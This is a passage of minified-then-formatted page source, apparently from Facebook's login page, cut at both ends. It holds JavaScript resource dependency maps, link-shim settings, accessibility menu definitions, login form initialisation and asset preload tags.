                "+xujYrB",
                "R0lSirj",
                "jpW6YKq",
                "CGkH4FY",
                "BDpTGZx",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "Zr3joV+",
                "tvWqIy4",
                "GKQxLch",
                "Vlvz+ek",
                "qIKb5tG",
                "WSN8hNl",
                "nc2ZTn5",
              ],
              rds: {
                m: [
                  "FbtLogging",
                  "IntlQtEventFalcoEvent",
                  "PageTransitions",
                  "BanzaiScuba_DEPRECATED",
                  "Animation",
                ],
                r: ["79Y8bmL"],
              },
              be: 1,
            },
            URI: { r: [], be: 1 },
            trackReferrer: {
              r: [],
              rds: { m: ["BanzaiScuba_DEPRECATED"], r: ["ZaK7abM", "s84NfZE"] },
              be: 1,
            },
            PhotoTagApproval: {
              r: ["56VCh9H", "s84NfZE", "lCiWnqM", "+xujYrB"],
              be: 1,
            },
            PhotoSnowlift: {
              r: [
                "vhw5GRt",
                "pndjTvI",
                "fvoLBbw",
                "UiX2b\/\/",
                "B6rkNZo",
                "mI4DZcu",
                "kyDs\/hf",
                "WSN8hNl",
                "+xujYrB",
                "HISU2Y8",
                "OHMMTib",
                "nc2ZTn5",
                "jyPWGxW",
                "PIDmGPV",
                "XCvu4Ie",
                "YRCZ+m1",
                "VtZ600j",
                "0nrQV8U",
                "TPVHIx9",
                "R0lSirj",
                "i1M3L7z",
                "oW+j\/g+",
                "jpW6YKq",
                "q16mIqM",
                "d9ty0O5",
                "CGkH4FY",
                "y8o969v",
                "BDpTGZx",
                "VdF6ypd",
                "F8jo2Dj",
                "ZaK7abM",
                "s84NfZE",
                "iWdauk4",
                "mgMxG66",
                "zVEN6sn",
                "tH07smz",
                "jM4vQSb",
                "Zr3joV+",
                "lCiWnqM",
                "+jRpToS",
                "0BPrThy",
                "Jujczgk",
                "6\/gN7tW",
                "PKrKxFl",
                "pLhJh6A",
                "kWILNCV",
                "+HQDBGp",
                "CXAPN\/1",
                "tvWqIy4",
                "CNG5DkE",
                "F\/p4sht",
                "GKQxLch",
                "zA+yJGG",
                "wwWSdab",
                "Vlvz+ek",
                "E+ty88w",
                "UJAzhS\/",
                "qIKb5tG",
                "79Y8bmL",
              ],
              rds: {
                m: [
                  "Animation",
                  "VisualCompletionGating",
                  "FbtLogging",
                  "IntlQtEventFalcoEvent",
                  "BanzaiScuba_DEPRECATED",
                  "PageTransitions",
                ],
                r: ["fmA3M6T"],
              },
              be: 1,
            },
            PhotoTagger: {
              r: [
                "xLSSZ58",
                "vhw5GRt",
                "pndjTvI",
                "fvoLBbw",
                "C9AITxH",
                "G2PzJgj",
                "UiX2b\/\/",
                "rvsXwIm",
                "kyDs\/hf",
                "faOx+SK",
                "WSN8hNl",
                "+xujYrB",
                "jj29UZB",
                "HISU2Y8",
                "OHMMTib",
                "JcJMiIF",
                "nc2ZTn5",
                "jyPWGxW",
                "56VCh9H",
                "XCvu4Ie",
                "VtZ600j",
                "0nrQV8U",
                "TPVHIx9",
                "R0lSirj",
                "dsV5VvK",
                "oW+j\/g+",
                "jpW6YKq",
                "9jeSk45",
                "q16mIqM",
                "diYp6Wz",
                "nh8Q+On",
                "CGkH4FY",
                "y8o969v",
                "BDpTGZx",
                "wxTMN2o",
                "\/lt63Q3",
                "VdF6ypd",
                "PPDBUJb",
                "KeLRD1z",
                "SrpP6vx",
                "L+z7QkP",
                "ZaK7abM",
                "s84NfZE",
                "iWdauk4",
                "m0x5Fgq",
                "mgMxG66",
                "zVEN6sn",
                "tH07smz",
                "LP\/Y1SY",
                "jM4vQSb",
                "lIaxUyf",
                "Zr3joV+",
                "lCiWnqM",
                "+jRpToS",
                "ziJBX6X",
                "0BPrThy",
                "Jujczgk",
                "w3Wk9lz",
                "TNzeBoy",
                "6\/gN7tW",
                "pLhJh6A",
                "BZq0Zvy",
                "DD828tu",
                "PogKv1z",
                "TuiPcIO",
                "kWILNCV",
                "oUzDp1n",
                "VJ1spXI",
                "14CUPgD",
                "CXAPN\/1",
                "fmA3M6T",
                "tvWqIy4",
                "s3WLiTz",
                "C0n1piG",
                "oB5OdKl",
                "F\/p4sht",
                "hUzOO1y",
                "J53Jy5d",
                "GKQxLch",
                "zA+yJGG",
                "wwWSdab",
                "Vlvz+ek",
                "aF9iPHd",
                "UJAzhS\/",
                "qIKb5tG",
                "79Y8bmL",
                "MShROPU",
                "e2\/yV+b",
                "NaRov2Z",
              ],
              rdfds: {
                m: [
                  "GamesVideoModerationRulesNux.react",
                  "GamesVideoDeleteCommentDialog.react",
                  "GamesVideoCommentRemovedDialog.react",
                  "CometTooltipDeferredImpl.react",
                ],
                r: [
                  "dLOHVPE",
                  "MtBBfeh",
                  "RncKcEA",
                  "owsyghQ",
                  "FIWs9pb",
                  "NCuetvN",
                  "i1M3L7z",
                  "9V\/+6wi",
                ],
              },
              rds: {
                m: [
                  "PresenceStatus",
                  "FbtLogging",
                  "IntlQtEventFalcoEvent",
                  "BanzaiScuba_DEPRECATED",
                  "Animation",
                  "PageTransitions",
                  "LynxAsyncCallbackFalcoEvent",
                  "CometSuspenseFalcoEvent",
                ],
                r: ["u4NoyfU"],
              },
              be: 1,
            },
            PhotoTags: {
              r: ["56VCh9H", "VdF6ypd", "s84NfZE", "lCiWnqM", "+xujYrB"],
              be: 1,
            },
            TagTokenizer: {
              r: [
                "faOx+SK",
                "WSN8hNl",
                "+xujYrB",
                "XmXQW8M",
                "56VCh9H",
                "VdF6ypd",
                "ZaK7abM",
                "PTs\/6Uy",
                "s84NfZE",
                "tH07smz",
                "6\/gN7tW",
                "kWILNCV",
                "R7NyDOd",
                "GKQxLch",
              ],
              rds: {
                m: ["FbtLogging", "IntlQtEventFalcoEvent"],
                r: ["UiX2b\/\/"],
              },
              be: 1,
            },
            AsyncDialog: {
              r: [
                "vhw5GRt",
                "pndjTvI",
                "UiX2b\/\/",
                "kyDs\/hf",
                "WSN8hNl",
                "+xujYrB",
                "R0lSirj",
                "jpW6YKq",
                "q16mIqM",
                "y8o969v",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "tH07smz",
                "Zr3joV+",
                "pLhJh6A",
                "tvWqIy4",
                "GKQxLch",
                "Vlvz+ek",
                "qIKb5tG",
                "nc2ZTn5",
              ],
              rds: { m: ["FbtLogging", "IntlQtEventFalcoEvent"] },
              be: 1,
            },
            Hovercard: {
              r: [
                "vhw5GRt",
                "UiX2b\/\/",
                "WSN8hNl",
                "+xujYrB",
                "OHMMTib",
                "nc2ZTn5",
                "XCvu4Ie",
                "R0lSirj",
                "jpW6YKq",
                "nh8Q+On",
                "CGkH4FY",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "m0x5Fgq",
                "Zr3joV+",
                "ziJBX6X",
                "6\/gN7tW",
                "tvWqIy4",
                "GKQxLch",
                "Vlvz+ek",
                "aF9iPHd",
                "qIKb5tG",
              ],
              rds: {
                m: [
                  "FbtLogging",
                  "IntlQtEventFalcoEvent",
                  "BanzaiScuba_DEPRECATED",
                  "PageTransitions",
                  "Animation",
                ],
                r: ["79Y8bmL"],
              },
              be: 1,
            },
            XSalesPromoWWWDetailsDialogAsyncController: {
              r: ["tQpMpFd"],
              be: 1,
            },
            XOfferController: { r: ["hIek+bG"], be: 1 },
            PerfXSharedFields: { r: ["VdF6ypd", "s84NfZE"], be: 1 },
            KeyEventTypedLogger: {
              r: ["ZaK7abM", "s84NfZE", "qyPFONl", "nc2ZTn5"],
              rds: { m: ["BanzaiScuba_DEPRECATED"] },
              be: 1,
            },
            Dialog: {
              r: [
                "UiX2b\/\/",
                "WSN8hNl",
                "+xujYrB",
                "jpW6YKq",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "mgMxG66",
                "6\/gN7tW",
                "tvWqIy4",
                "GKQxLch",
                "Vlvz+ek",
                "R0lSirj",
                "79Y8bmL",
                "nc2ZTn5",
              ],
              rds: {
                m: [
                  "FbtLogging",
                  "IntlQtEventFalcoEvent",
                  "Animation",
                  "PageTransitions",
                  "BanzaiScuba_DEPRECATED",
                ],
              },
              be: 1,
            },
            ExceptionDialog: {
              r: [
                "vhw5GRt",
                "pndjTvI",
                "fvoLBbw",
                "UiX2b\/\/",
                "kyDs\/hf",
                "WSN8hNl",
                "+xujYrB",
                "XCvu4Ie",
                "R0lSirj",
                "i1M3L7z",
                "rRSeTc7",
                "jpW6YKq",
                "q16mIqM",
                "y8o969v",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "Zr3joV+",
                "ziJBX6X",
                "pLhJh6A",
                "tvWqIy4",
                "s3WLiTz",
                "GKQxLch",
                "Vlvz+ek",
                "qIKb5tG",
                "nc2ZTn5",
              ],
              rds: { m: ["FbtLogging", "IntlQtEventFalcoEvent"] },
              be: 1,
            },
            QuickSandSolver: {
              r: [
                "WSN8hNl",
                "x22Oby4",
                "jpW6YKq",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "8ELCBwH",
                "Njh67P7",
                "SWx3yNv",
                "F\/p4sht",
                "+xujYrB",
              ],
              rds: {
                m: ["FbtLogging", "IntlQtEventFalcoEvent"],
                r: ["UiX2b\/\/"],
              },
              be: 1,
            },
            ConfirmationDialog: {
              r: ["oE4DofT", "WSN8hNl", "s84NfZE", "GKQxLch", "+xujYrB"],
              be: 1,
            },
            QPLInspector: { r: ["VvVFw8n"], be: 1 },
            ReactDOM: {
              r: ["R0lSirj", "nc2ZTn5", "qIKb5tG", "s84NfZE", "+xujYrB"],
              be: 1,
            },
            ContextualLayerInlineTabOrder: {
              r: [
                "vhw5GRt",
                "+xujYrB",
                "BDpTGZx",
                "s84NfZE",
                "m0x5Fgq",
                "GKQxLch",
              ],
              be: 1,
            },
            "XUIDialogButton.react": {
              r: [
                "vhw5GRt",
                "kyDs\/hf",
                "+xujYrB",
                "XCvu4Ie",
                "R0lSirj",
                "i1M3L7z",
                "jpW6YKq",
                "q16mIqM",
                "y8o969v",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "pLhJh6A",
                "tvWqIy4",
                "GKQxLch",
                "Vlvz+ek",
                "qIKb5tG",
                "nc2ZTn5",
              ],
              rds: {
                m: ["FbtLogging", "IntlQtEventFalcoEvent"],
                r: ["UiX2b\/\/"],
              },
              be: 1,
            },
            "XUIDialogBody.react": {
              r: [
                "vhw5GRt",
                "fvoLBbw",
                "XCvu4Ie",
                "R0lSirj",
                "i1M3L7z",
                "s84NfZE",
                "tvWqIy4",
                "Vlvz+ek",
                "qIKb5tG",
                "ZaK7abM",
                "nc2ZTn5",
              ],
              be: 1,
            },
            "XUIDialogFooter.react": {
              r: [
                "vhw5GRt",
                "pndjTvI",
                "fvoLBbw",
                "XCvu4Ie",
                "R0lSirj",
                "i1M3L7z",
                "q16mIqM",
                "s84NfZE",
                "ziJBX6X",
                "tvWqIy4",
                "Vlvz+ek",
                "qIKb5tG",
                "ZaK7abM",
                "nc2ZTn5",
              ],
              be: 1,
            },
            "XUIDialogTitle.react": {
              r: [
                "vhw5GRt",
                "pndjTvI",
                "kyDs\/hf",
                "R0lSirj",
                "jpW6YKq",
                "q16mIqM",
                "y8o969v",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "Zr3joV+",
                "tvWqIy4",
                "Vlvz+ek",
                "+xujYrB",
                "qIKb5tG",
                "nc2ZTn5",
              ],
              rds: {
                m: ["FbtLogging", "IntlQtEventFalcoEvent"],
                r: ["UiX2b\/\/"],
              },
              be: 1,
            },
            "XUIGrayText.react": {
              r: [
                "vhw5GRt",
                "fvoLBbw",
                "XCvu4Ie",
                "R0lSirj",
                "i1M3L7z",
                "s84NfZE",
                "Vlvz+ek",
                "qIKb5tG",
                "ZaK7abM",
                "nc2ZTn5",
              ],
              be: 1,
            },
            DialogX: {
              r: [
                "UiX2b\/\/",
                "WSN8hNl",
                "+xujYrB",
                "jpW6YKq",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "Zr3joV+",
                "tvWqIy4",
                "GKQxLch",
                "Vlvz+ek",
              ],
              rds: { m: ["FbtLogging", "IntlQtEventFalcoEvent"] },
              be: 1,
            },
            React: { r: ["R0lSirj", "nc2ZTn5"], be: 1 },
          },
        });
      });
    </script>
    <script>
      requireLazy(["InitialJSLoader"], function (InitialJSLoader) {
        InitialJSLoader.loadOnDOMContentReady([
          "jpW6YKq",
          "fmA3M6T",
          "vhw5GRt",
          "UiX2b\/\/",
          "GKQxLch",
          "R0lSirj",
          "VdF6ypd",
          "ZaK7abM",
          "s84NfZE",
          "Vlvz+ek",
          "BDpTGZx",
          "79Y8bmL",
          "WSN8hNl",
          "CGkH4FY",
          "nc2ZTn5",
          "qIKb5tG",
          "P\/mr5VE",
        ]);
      });
    </script>
    <script>
      requireLazy(
        ["TimeSliceImpl", "ServerJS"],
        function (TimeSlice, ServerJS) {
          var s = new ServerJS();
          s.handle({
            define: [
              [
                "LinkshimHandlerConfig",
                [],
                {
                  supports_meta_referrer: true,
                  default_meta_referrer_policy: "origin-when-crossorigin",
                  switched_meta_referrer_policy: "origin",
                  non_linkshim_lnfb_mode: null,
                  link_react_default_hash:
                    "AT1CM6oKbyujS_xUrrt1AKU2Z-pwCSYb1UgvxEnmz5oMBfAESYOqlkiDefdud0G6SUrqIooaTJVhVctTwCv3aeyjyITqPvUKt4mMaNqnQHQA362ShJwZOx6OUVkh3UbYpftR_B_M7pidQI0p4zBb1A",
                  untrusted_link_default_hash:
                    "AT2EYxFLlpi4AKWOF0JahHkEaEUGKjfFBcIfdvksH2xtLu_KcWrbEXfZY7Q0IYv2H0o0qWhfdCwq9GZCr8lfajlYH2R91nCOzm79s9BNNsRc8-YHdgV9hJtZB-I3uE8Qbg7SBPNj19lpjcl4SQR5pA",
                  linkshim_host: "l.facebook.com",
                  linkshim_path: "\/l.php",
                  linkshim_enc_param: "h",
                  linkshim_url_param: "u",
                  use_rel_no_opener: true,
                  always_use_https: true,
                  onion_always_shim: true,
                  middle_click_requires_event: true,
                  www_safe_js_mode: "asynclazy",
                  m_safe_js_mode: "MLynx_asynclazy",
                  ghl_param_link_shim: false,
                  click_ids: [],
                  is_linkshim_supported: true,
                  current_domain: "facebook.com",
                  blocklisted_domains: [
                    "ad.doubleclick.net",
                    "ads-encryption-url-example.com",
                    "bs.serving-sys.com",
                    "ad.atdmt.com",
                    "adform.net",
                    "ad13.adfarm1.adition.com",
                    "ilovemyfreedoms.com",
                    "secure.adnxs.com",
                  ],
                  is_mobile_device: false,
                },
                27,
              ],
            ],
            instances: [
              [
                "__inst_5b4d0c00_0_0_1t",
                ["Menu", "XUIMenuWithSquareCorner", "XUIMenuTheme"],
                [
                  [],
                  {
                    id: "u_0_0_yf",
                    behaviors: [{ __m: "XUIMenuWithSquareCorner" }],
                    theme: { __m: "XUIMenuTheme" },
                  },
                ],
                2,
              ],
              [
                "__inst_5b4d0c00_0_1_zs",
                [
                  "Menu",
                  "MenuItem",
                  "__markup_3310c079_0_0_ug",
                  "HTML",
                  "__markup_3310c079_0_1_M0",
                  "__markup_3310c079_0_2_SR",
                  "__markup_3310c079_0_3_u0",
                  "XUIMenuWithSquareCorner",
                  "XUIMenuTheme",
                ],
                [
                  [
                    {
                      value: "key_shortcuts",
                      ctor: { __m: "MenuItem" },
                      markup: { __m: "__markup_3310c079_0_0_ug" },
                      label: "Keyboard shortcut help...",
                      title: "",
                      className: null,
                    },
                    {
                      href: "\/help\/accessibility",
                      target: "_blank",
                      value: "help_center",
                      ctor: { __m: "MenuItem" },
                      markup: { __m: "__markup_3310c079_0_1_M0" },
                      label: "Accessibility Help Centre",
                      title: "",
                      className: null,
                    },
                    {
                      href: "\/help\/contact\/accessibility",
                      target: "_blank",
                      value: "submit_feedback",
                      ctor: { __m: "MenuItem" },
                      markup: { __m: "__markup_3310c079_0_2_SR" },
                      label: "Submit feedback",
                      title: "",
                      className: null,
                    },
                    {
                      href: "\/accessibility",
                      target: "_blank",
                      value: "facebook_page",
                      ctor: { __m: "MenuItem" },
                      markup: { __m: "__markup_3310c079_0_3_u0" },
                      label: "Updates from Facebook Accessibility",
                      title: "",
                      className: null,
                    },
                  ],
                  {
                    id: "u_0_1_jC",
                    behaviors: [{ __m: "XUIMenuWithSquareCorner" }],
                    theme: { __m: "XUIMenuTheme" },
                  },
                ],
                2,
              ],
              [
                "__inst_e5ad243d_0_0_YI",
                [
                  "PopoverMenu",
                  "__inst_1de146dc_0_1_cq",
                  "__elem_ec77afbd_0_1_ot",
                  "__inst_5b4d0c00_0_1_zs",
                ],
                [
                  { __m: "__inst_1de146dc_0_1_cq" },
                  { __m: "__elem_ec77afbd_0_1_ot" },
                  { __m: "__inst_5b4d0c00_0_1_zs" },
                  [],
                ],
                2,
              ],
              [
                "__inst_e5ad243d_0_1_eY",
                [
                  "PopoverMenu",
                  "__inst_1de146dc_0_0_3l",
                  "__elem_ec77afbd_0_0_kJ",
                  "__inst_5b4d0c00_0_0_1t",
                ],
                [
                  { __m: "__inst_1de146dc_0_0_3l" },
                  { __m: "__elem_ec77afbd_0_0_kJ" },
                  { __m: "__inst_5b4d0c00_0_0_1t" },
                  [],
                ],
                2,
              ],
              [
                "__inst_1de146dc_0_0_3l",
                [
                  "Popover",
                  "__elem_1de146dc_0_0_yk",
                  "__elem_ec77afbd_0_0_kJ",
                  "ContextualLayerAutoFlip",
                  "ContextualDialogArrow",
                ],
                [
                  { __m: "__elem_1de146dc_0_0_yk" },
                  { __m: "__elem_ec77afbd_0_0_kJ" },
                  [
                    { __m: "ContextualLayerAutoFlip" },
                    { __m: "ContextualDialogArrow" },
                  ],
                  { alignh: "left", position: "below" },
                ],
                2,
              ],
              [
                "__inst_1de146dc_0_1_cq",
                [
                  "Popover",
                  "__elem_1de146dc_0_1_Wz",
                  "__elem_ec77afbd_0_1_ot",
                  "ContextualLayerAutoFlip",
                  "ContextualDialogArrow",
                ],
                [
                  { __m: "__elem_1de146dc_0_1_Wz" },
                  { __m: "__elem_ec77afbd_0_1_ot" },
                  [
                    { __m: "ContextualLayerAutoFlip" },
                    { __m: "ContextualDialogArrow" },
                  ],
                  { alignh: "right", position: "below" },
                ],
                2,
              ],
            ],
            markup: [
              [
                "__markup_3310c079_0_0_ug",
                { __html: "Keyboard shortcut help..." },
                1,
              ],
              [
                "__markup_3310c079_0_1_M0",
                { __html: "Accessibility Help Centre" },
                1,
              ],
              ["__markup_3310c079_0_2_SR", { __html: "Submit feedback" }, 1],
              [
                "__markup_3310c079_0_3_u0",
                { __html: "Updates from Facebook Accessibility" },
                1,
              ],
            ],
            elements: [
              ["__elem_a588f507_0_1_Ei", "u_0_3_eJ", 1],
              ["__elem_3fc3da18_0_0_Ke", "u_0_4_T4", 1],
              ["__elem_51be6cb7_0_0_\/m", "u_0_5_LJ", 1],
              ["__elem_1de146dc_0_0_yk", "u_0_6_HH", 1],
              ["__elem_ec77afbd_0_0_kJ", "u_0_7_EV", 2],
              ["__elem_1de146dc_0_1_Wz", "u_0_8_r3", 1],
              ["__elem_ec77afbd_0_1_ot", "u_0_9_Ul", 2],
              ["__elem_a588f507_0_0_bk", "globalContainer", 2],
              ["__elem_a588f507_0_2_Wy", "content", 1],
              ["__elem_835c633a_0_0_m1", "u_0_a_OZ", 1],
              ["__elem_9f5fac15_0_0_C2", "passContainer", 1],
              ["__elem_558608f3_0_0_aQ", "pass", 1],
              ["__elem_a588f507_0_3_RY", "u_0_b_nf", 1],
              ["__elem_a588f507_0_4_er", "u_0_c_3I", 1],
              ["__elem_45d73b5d_0_0_9a", "u_0_d_5u", 1],
            ],
            require: [
              ["ServiceWorkerLoginAndLogout", "login", [], []],
              ["WebPixelRatioDetector", "startDetecting", [], [false]],
              [
                "ScriptPath",
                "set",
                [],
                [
                  "XIndexReduxController",
                  "a1f3c513",
                  {
                    imp_id: "0lVvD6NfemVaY72nP",
                    ef_page: null,
                    uri: "https:\/\/www.facebook.com\/",
                  },
                ],
              ],
              ["UITinyViewportAction", "init", [], []],
              [
                "ResetScrollOnUnload",
                "init",
                ["__elem_a588f507_0_0_bk"],
                [{ __m: "__elem_a588f507_0_0_bk" }],
              ],
              [
                "AccessibilityWebVirtualCursorClickLogger",
                "init",
                ["__elem_a588f507_0_0_bk"],
                [[{ __m: "__elem_a588f507_0_0_bk" }]],
              ],
              ["KeyboardActivityLogger", "init", [], []],
              ["FocusRing", "init", [], []],
              ["ErrorMessageConsole", "listenForUncaughtErrors", [], []],
              ["HardwareCSS", "init", [], []],
              [
                "NavigationAssistantController",
                "init",
                [
                  "__elem_3fc3da18_0_0_Ke",
                  "__elem_51be6cb7_0_0_\/m",
                  "__inst_5b4d0c00_0_0_1t",
                  "__inst_5b4d0c00_0_1_zs",
                  "__inst_e5ad243d_0_0_YI",
                  "__inst_e5ad243d_0_1_eY",
                ],
                [
                  { __m: "__elem_3fc3da18_0_0_Ke" },
                  { __m: "__elem_51be6cb7_0_0_\/m" },
                  { __m: "__inst_5b4d0c00_0_0_1t" },
                  { __m: "__inst_5b4d0c00_0_1_zs" },
                  null,
                  {
                    accessibilityPopoverMenu: { __m: "__inst_e5ad243d_0_0_YI" },
                    globalPopoverMenu: null,
                    sectionsPopoverMenu: { __m: "__inst_e5ad243d_0_1_eY" },
                  },
                  true,
                ],
              ],
              ["__inst_e5ad243d_0_1_eY"],
              ["__inst_1de146dc_0_0_3l"],
              ["__inst_e5ad243d_0_0_YI"],
              ["__inst_1de146dc_0_1_cq"],
              ["IntlUtils"],
              [
                "LoginFormController",
                "init",
                ["__elem_835c633a_0_0_m1", "__elem_45d73b5d_0_0_9a"],
                [
                  { __m: "__elem_835c633a_0_0_m1" },
                  { __m: "__elem_45d73b5d_0_0_9a" },
                  null,
                  true,
                  {
                    pubKey: {
                      publicKey:
                        "77f9792a38bc63c034ff277d67ddf1690f52d5bcf01eadbb8c8bfca607283a61",
                      keyId: 206,
                    },
                  },
                ],
              ],
              [
                "BrowserPrefillLogging",
                "initContactpointFieldLogging",
                [],
                [{ contactpointFieldID: "email", serverPrefill: "" }],
              ],
              [
                "BrowserPrefillLogging",
                "initPasswordFieldLogging",
                [],
                [{ passwordFieldID: "pass" }],
              ],
              ["FocusListener"],
              ["FlipDirectionOnKeypress"],
              [
                "LoginFormToggle",
                "initToggle",
                [
                  "__elem_a588f507_0_3_RY",
                  "__elem_a588f507_0_4_er",
                  "__elem_558608f3_0_0_aQ",
                  "__elem_9f5fac15_0_0_C2",
                ],
                [
                  { __m: "__elem_a588f507_0_3_RY" },
                  { __m: "__elem_a588f507_0_4_er" },
                  { __m: "__elem_558608f3_0_0_aQ" },
                  { __m: "__elem_9f5fac15_0_0_C2" },
                ],
              ],
              ["FBLynx", "setupDelegation", [], []],
              ["Animation"],
              ["PageTransitions"],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [
                  [
                    "BanzaiScuba_DEPRECATED",
                    "Animation",
                    "FbtLogging",
                    "IntlQtEventFalcoEvent",
                    "PageTransitions",
                  ],
                  "sd",
                ],
              ],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [
                  [
                    "BanzaiScuba_DEPRECATED",
                    "Animation",
                    "FbtLogging",
                    "IntlQtEventFalcoEvent",
                    "PageTransitions",
                  ],
                  "css",
                ],
              ],
              ["TimeSliceImpl"],
              ["HasteSupportData"],
              ["ServerJS"],
              ["Run"],
              ["InitialJSLoader"],
            ],
            contexts: [
              [{ __m: "__elem_a588f507_0_1_Ei" }, true],
              [{ __m: "__elem_a588f507_0_2_Wy" }, true],
            ],
          });
          requireLazy(["Run"], function (Run) {
            Run.onAfterLoad(function () {
              s.cleanup(TimeSlice);
            });
          });
        }
      );
    </script>
    <script>
      now_inl = (function () {
        var p = window.performance;
        return p && p.now && p.timing && p.timing.navigationStart
          ? function () {
              return p.now() + p.timing.navigationStart;
            }
          : function () {
              return new Date().getTime();
            };
      })();
      window.__bigPipeFR = now_inl();
    </script>
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/zvfS2wV_bL3.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/y3/l/0,cross/5WfpJC2KSHe.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/EE0cKe4KBQ3.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/S81YVWe8H_A.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/l/0,cross/PG5tRCkVwWX.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yY/l/en_GB/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce=""
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/PvBFn7IF58H.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce=""
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/UXJE_KFXmfT.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce=""
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/ymUKktuYtLv.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce=""
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/tkUx0C0mTdH.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <script>
      window.__bigPipeCtor = now_inl();
      requireLazy(["BigPipe"], function (BigPipe) {
        define("__bigPipe", [], (window.bigPipe = new BigPipe({
          forceFinish: true,
          config: {
            flush_pagelets_asap: true,
            dispatch_pagelet_replayable_actions: false,
          },
        })));
      });
    </script>
    <script nonce="">
      (function () {
        var n = now_inl();
        requireLazy(["__bigPipe"], function (bigPipe) {
          bigPipe.beforePageletArrive("first_response", n);
        });
      })();
    </script>
    <script nonce="">
      requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.onPageletArrive({
          displayResources: [
            "KeLRD1z",
            "XCvu4Ie",
            "+xujYrB",
            "tH07smz",
            "tvWqIy4",
            "jpW6YKq",
            "VdF6ypd",
            "ZaK7abM",
            "s84NfZE",
            "U7cyoYM",
            "P/mr5VE",
          ],
          id: "first_response",
          phase: 0,
          last_in_phase: true,
          tti_phase: 0,
          all_phases: [63],
          hsrp: { hblp: { consistency: { rev: 1005083598 } } },
          allResources: [
            "jpW6YKq",
            "fmA3M6T",
            "vhw5GRt",
            "UiX2b//",
            "GKQxLch",
            "R0lSirj",
            "VdF6ypd",
            "ZaK7abM",
            "s84NfZE",
            "Vlvz+ek",
            "BDpTGZx",
            "KeLRD1z",
            "XCvu4Ie",
            "+xujYrB",
            "tH07smz",
            "tvWqIy4",
            "U7cyoYM",
            "79Y8bmL",
            "WSN8hNl",
            "P/mr5VE",
            "CGkH4FY",
            "nc2ZTn5",
            "qIKb5tG",
          ],
        });
      });
    </script>
    <script>
      requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.setPageID("7065651880395410549-0");
      });
      CavalryLogger.setPageID("7065651880395410549-0");
    </script>
    <script nonce="">
      (function () {
        var n = now_inl();
        requireLazy(["__bigPipe"], function (bigPipe) {
          bigPipe.beforePageletArrive("last_response", n);
        });
      })();
    </script>
    <script nonce="">
      requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.onPageletArrive({
          displayResources: ["ZaK7abM"],
          id: "last_response",
          phase: 63,
          last_in_phase: true,
          the_end: true,
          jsmods: {
            define: [
              [
                "TimeSliceInteractionSV",
                [],
                {
                  on_demand_reference_counting: true,
                  on_demand_profiling_counters: true,
                  default_rate: 1000,
                  lite_default_rate: 100,
                  interaction_to_lite_coinflip: {
                    ADS_INTERFACES_INTERACTION: 0,
                    ads_perf_scenario: 0,
                    ads_wait_time: 0,
                    Event: 1,
                  },
                  interaction_to_coinflip: {
                    ADS_INTERFACES_INTERACTION: 1,
                    ads_perf_scenario: 1,
                    ads_wait_time: 1,
                    Event: 100,
                  },
                  enable_heartbeat: true,
                  maxBlockMergeDuration: 0,
                  maxBlockMergeDistance: 0,
                  enable_banzai_stream: true,
                  user_timing_coinflip: 50,
                  banzai_stream_coinflip: 0,
                  compression_enabled: true,
                  ref_counting_fix: false,
                  ref_counting_cont_fix: false,
                  also_record_new_timeslice_format: false,
                  force_async_request_tracing_on: false,
                },
                2609,
              ],
              [
                "WebDriverConfig",
                [],
                {
                  isTestRunning: false,
                  isJestE2ETestRun: false,
                  auxiliaryServiceInfo: {},
                  testPath: null,
                  originHost: null,
                },
                5332,
              ],
              [
                "cr:1642797",
                ["BanzaiBase"],
                {
                  __rc: [
                    "BanzaiBase",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:1458113",
                [],
                {
                  __rc: [
                    null,
